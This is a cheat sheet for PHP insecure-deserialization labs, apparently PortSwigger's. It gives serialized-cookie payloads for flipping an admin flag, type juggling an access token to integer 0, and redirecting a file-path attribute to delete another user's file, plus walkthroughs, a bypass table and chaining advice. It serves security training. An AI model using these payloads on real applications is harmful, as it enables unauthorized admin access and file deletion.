# Insecure deserialization — Object manipulation (PHP)

Modify attribute values directly in a PHP serialized object: flip boolean `admin` flag, change data type to exploit loose comparison (type juggling), or redirect a file-path attribute to an arbitrary target that the app acts on.

## Quick reference
```php
# PHP serialization format
O:<classLen>:"<ClassName>":<propCount>:{
  s:<nameLen>:"<propName>";   # property name (string)
  b:0;                        # boolean false
  b:1;                        # boolean true
  s:<len>:"<value>";          # string value
  i:<n>;                      # integer (no quotes)
}

# 1) Admin flag flip
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}

# 2) Type juggling: integer 0 equals any non-numeric string in PHP loose ==
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}

# 3) File path redirect (avatar_link → carlos's file)
s:11:"avatar_link";s:23:"/home/carlos/morale.txt"
```

## Root cause
PHP deserializes the cookie and uses the resulting object directly without re-validating field types or values. Loose comparison (`==` vs `===`) lets `i:0` match any string. File-path attributes are trusted from the deserialized object without sanitization.

## Find it
1. Log in → Burp Inspector on any request with a cookie → look for `O:` prefix after Base64+URL decode.
2. Read the decoded PHP object; identify security-relevant attributes (`admin`, `access_token`, `avatar_link`).
3. Modify in Inspector → Apply changes → re-encode automatically → send.

## Technique
**Admin flag (Lab 1):**
1. POST /login → cookie decoded = `O:4:"User":2:{...s:5:"admin";b:0;}`.
2. Inspector → change `b:0` → `b:1` → Apply.
3. GET /my-account → admin link visible in response.
4. GET /admin → GET /admin/delete?username=carlos.

**Type juggling (Lab 2):**
1. Cookie decoded = `O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"abcd1234...";}`.
2. Inspector → change username string to `s:13:"administrator"`, change access_token type from `s` to `i:0` (remove quotes, change prefix).
3. Apply → send → admin panel link appears → /admin/delete?username=carlos.

**File path redirect (Lab 3):**
1. Cookie contains `avatar_link` = path to avatar file.
2. DELETE /my-account triggers avatar file deletion using the path from cookie.
3. Change `avatar_link` value to `/home/carlos/morale.txt` (update length: `s:23:`).
4. POST /my-account/delete with modified cookie → carlos's file deleted.

## Payload arsenal
```
# Lab 1 — admin=true
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}

# Lab 2 — type juggling (integer 0)
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}

# Lab 3 — file path redirect
s:11:"avatar_link";s:23:"/home/carlos/morale.txt"
# Full object (adjust prop count and structure to match original)
```

## Bypasses
| Defense | Bypass |
|---|---|
| Client-side only checks | Modify cookie server-side in Burp before it's processed |
| Signature on cookie | Object-manipulation only works when there is NO signature (see Gadget-chains-pre-built for signed cookies) |
| `===` strict comparison on access token | Type juggling only works with loose `==`; check PHP version + comparison operator in source |

## Exploitation walkthrough
**Lab 1:** Inspector: change `b:0` → `b:1` → Apply → send → GET /admin → /admin/delete?username=carlos.
**Lab 2:** Inspector: change username length+value to administrator, change access_token to `i:0` → Apply → send → admin access → delete carlos.
**Lab 3:** Inspector: change avatar_link string to `/home/carlos/morale.txt` (length 23) → POST /my-account/delete → file deleted.

## Chaining
- Admin bypass → [Access-control](../../Access-control/) (same admin panel access).
- File-path attribute → arbitrary file read/delete → can chain to RCE if writable paths are in web root.

## Tools
- **Burp Inspector panel** — decode, edit, re-encode PHP serialized objects inline without external tools

## Labs

### Modifying serialized objects [Apprentice]
Cookie = PHP object with `admin=b:0`. Change to `b:1` in Burp Inspector → /admin → delete carlos. Key insight: server trusts the admin attribute from the deserialized cookie without re-checking privileges.

### Modifying serialized data types [Practitioner]
Change username to `administrator` and access_token to integer `i:0`. PHP loose comparison `0 == "token-string"` = true → admin access. Key insight: PHP type juggling — integer 0 matches any non-numeric string.

### Using application functionality to exploit insecure deserialization [Practitioner]
Cookie has `avatar_link` = file path. POST /my-account/delete deletes that file. Change path to `/home/carlos/morale.txt` → delete fires on carlos's file instead. Key insight: deserialized file paths are acted on directly — no re-validation.

## Real-world notes
- PHP loose comparison is a pervasive source of type-juggling bugs; `i:0` bypasses many token checks.
- Always check for file-path, URL, or command string attributes in deserialized objects — they're direct code execution paths.
- Burp Inspector handles PHP/Java/Ruby serialization; no external tools needed for simple attribute modification.

## References
- https://portswigger.net/web-security/deserialization/exploiting
